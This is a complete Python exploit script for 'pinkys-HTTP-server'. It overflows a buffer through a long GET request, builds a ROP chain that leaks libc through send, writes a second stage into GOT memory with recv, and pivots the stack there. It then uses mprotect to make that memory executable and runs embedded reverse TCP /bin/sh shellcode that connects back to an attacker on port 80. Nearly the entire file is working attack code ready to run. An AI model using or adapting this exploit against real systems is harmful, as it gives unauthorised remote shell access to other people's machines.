# Exploit for pinkys-HTTP-server
# Usage: python2 phs_ex.py <HOST>
# Summary: Buffer Overflow thats leads to ROP.
#  First I call send@plt to leak address at send_got to get mprotect offset.
#  Next I call recv@plt and write incoming buffer (150 bytes) to GOT mapped memory.
#  Next I stack pivot to the address written to on the GOT memory
#  Next I then call mmap syscall within mprotect libc call to make GOT mapped memory (My fake stack) executable
#  Next I jmp execution to my fake stack holding reverse TCP shellcode and execute a reverse TCP shell to connect back on port 80
#
# Remember to regenerate shellcode to connect back to your machine
# Written by @Pink_P4nther <pinkp4nther@protonmail.com>

from socket import *
from pwn import p32
from pwn import u32
import sys

if len(sys.argv) < 2:
    sys.exit("Usage: {} <HOST>".format(sys.argv[0]))

HOST = str(sys.argv[1])

s = socket()
s.connect((HOST,65535))

buf = ""
buf += "GET /" # Make GET request
buf += "A"*1019 #Offset

# Send send_libc address

# pop values onto stack for editing
buf += p32(0x08048e1b) # pop edi; pop esi; pop e*x; ret

# pop send_plt into esi and address to return from
buf += p32(0x8048840) # send_PLT [edi]
buf += p32(0x804906e) # return addr from send_PLT (addesp 16) [esi]

# send() args
buf += p32(0xffffffff) #FD [edx]
buf += p32(0x804b080) #send GOT [ecx]
buf += p32(0xffffffff) # byte amount [ebx]
buf += p32(0xffffffff) # flags 0 [eax]

# operations on send() args
buf += p32(0x08048e15)*0x5 # inc edx FD (0x5 for [4] (first connection to HTTP server since reboot)) [Every time a fork crashes increase FD by one]
buf += p32(0x08048e19)*0x5 # inc ebx BYTE TO SEND (sending four bytes)
buf += p32(0x08048dff) # inc eax

# setup stack
buf += p32(0x08048e22) # push e?x; push esi; push edi; ret

# padding because of addesp instruction
buf += "B"*12

# Recv bytes write to GOT and stack pivot to GOT memory page
# FD: X
# buffer to write to (GOT): 0x0804b004
# ammount of bytes to read: size of payload
# OPERATIONS
# pop args and ret addr and read plt into registers
# inc FD register
# inc byte register to size of stage2 payload
# push stack pivot addr 
# push byte amount
# push write buffer addr (GOT)
# push FD
# push ret addr
# push read_plt

buf += p32(0x08048e1b) # pop edi; pop esi; pop e[d->a]x; ret
buf += p32(0x08048690) # recv_PLT [edi]
buf += p32(0x08048e29) # ret addr from recv_PLT (STACK PIVOT) [xchg esp, ecx] [esi]
buf += p32(0xffffffff) # FD [edx]
buf += p32(0x804b090) # GOT mapped addr + 0x4 [ecx]
buf += p32(0xffffffff) # amount of bytes to recv [ebx]
buf += "C"*4 # Fill eax with trash [eax]
buf += p32(0x08048e15)*0x5 # inc FD (0x5 for [4] (first connection to HTTP server since reboot)) [Every time a fork crashes increase FD by one]
buf += p32(0x08048e19)*150 # inc ebx bytes to recv
buf += p32(0x08048e22) # push values back onto stack

buf += " HTTP/1.0\r\n"
s.send(buf)

# Get libc addresses
send_addr = s.recv(4)
send_addr = u32(send_addr)

send_offset = 0x000e8da0
mprotect_offset = 0x000e3840

libc_base = send_addr - send_offset
mprotect_addr = libc_base + mprotect_offset

print("[+] libc_base: "+hex(libc_base))
print("[+] send_libc: "+hex(send_addr))
print("[+] mprotect_libc "+hex(mprotect_addr))
print("[+] Target mprotect [mprotect + 13]: "+hex(mprotect_addr+13))

# Reverse TCP /bin/sh Port: [80]
shellcode = (
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
    "\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xac\x13\x13\xfb\x66\x68"
    "\x00\x50\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
    "\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xb0\x0b\xcd\x80"
)

# SETUP MPROTECT
buf2 = ""
buf2 += p32(0x08048e13) # pop edx; ret
buf2 += p32(0xffffffff) # mem page perms rwx
buf2 += p32(0x08048e15)*8 # inc edx; ret
buf2 += p32(0x08048ded) # pop ecx; ret
buf2 += p32(0x10101010) # amount of memory
buf2 += p32(0x0804865d) # pop ebx; ret
buf2 += p32(0x804b090) # address of Global Offset Table memory segment
buf2 += p32(mprotect_addr+13) # mprotect + 13
buf2 += "B"*4 # pad for pop ebx at end of mprotect

# Return to fake stack
buf2 += p32(0x804b0d4) # setup jmp to sc 
buf2 += shellcode
buf2 += "\xcc"

print("[!!!] Popping Shellcode!")
s.send(buf2)

